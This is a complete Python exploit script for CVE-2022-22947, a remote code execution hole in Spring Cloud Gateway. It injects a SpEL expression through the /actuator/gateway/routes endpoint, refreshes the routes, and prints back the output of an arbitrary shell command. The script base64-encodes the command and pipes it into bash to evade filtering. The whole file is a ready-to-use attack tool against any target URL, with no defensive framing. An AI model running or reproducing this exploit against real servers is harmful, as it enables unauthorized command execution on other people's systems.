#!/usr/bin/env python3


import requests, json, sys, base64


#proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def rce(url, cmd):
    h1 = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
      'Content-Type': 'application/json'
    }
    data = {
    "id": "ee",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"" + cmd +"\").getInputStream()))}"
        }
    }],
    "uri": "http://aaaa.aa",
    "order": 0
}

    res1 = requests.post('{}/actuator/gateway/routes/ee'.format(url), data = json.dumps(data, ensure_ascii = False), headers = h1, verify = False)#, proxies = proxies)
    res2 = requests.post('{}/actuator/gateway/refresh'.format(url), headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',}, verify = False)
    res3 = requests.get('{}/actuator/gateway/routes/ee'.format(url), headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',}, verify = False)
    print(res3.text)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('使用： python cve-2022-22947.py  url  cmd')
        sys.exit(1)
    
    url = sys.argv[-2]
    if url[-1] == '/':
        url = url[:-1]
    
    cmd = sys.argv[-1]
    cmd = 'bash -c {echo,' + base64.b64encode(cmd.encode()).decode() + '}|{base64,-d}|{bash,-i}'
    if not (url.startswith('http://') or url.startswith('https://')):
        print('使用： python cve-2022-22947.py  url  cmd')
        sys.exit(1)
    
    rce(url, cmd)